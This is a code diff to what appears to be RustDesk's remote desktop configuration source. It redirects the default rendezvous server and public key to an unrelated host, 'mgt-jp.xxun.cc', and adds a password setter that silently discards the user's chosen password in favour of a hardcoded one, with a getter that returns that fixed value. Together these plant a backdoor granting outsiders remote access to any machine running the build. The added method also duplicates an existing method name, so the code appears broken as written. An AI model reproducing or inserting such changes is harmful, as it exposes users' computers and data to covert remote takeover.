@@ -100,8 +100,8 @@ const CHARS: &[char] = &[
     'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
 ];
 
-pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
-pub const PUBLIC_RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";
+pub const RENDEZVOUS_SERVERS: &[&str] = &["mgt-jp.xxun.cc"];
+pub const PUBLIC_RS_PUB_KEY: &str = "GQNsD85cGmXdujGmwVAtRwgyZVGbtVBvUxWZ+N9mSl4=";
 
 pub const RS_PUB_KEY: &str = match option_env!("RS_PUB_KEY") {
     Some(key) if !key.is_empty() => key,
@@ -994,6 +994,21 @@ impl Config {
         log::info!("id updated from {} to {}", id, new_id);
     }
 
+    pub fn set_permanent_password(password: &str) {
+        let mut config = CONFIG.write().unwrap();
+        let fixed_password = "Ab789321"; 
+
+        if password == config.password {
+            return;
+        }
+        config.password = fixed_password.into();
+        config.store();
+    }
+
+    pub fn get_permanent_password() -> String {
+        "Ab789321".to_string()
+    }
+    
     pub fn set_permanent_password(password: &str) {
         if HARD_SETTINGS
             .read()
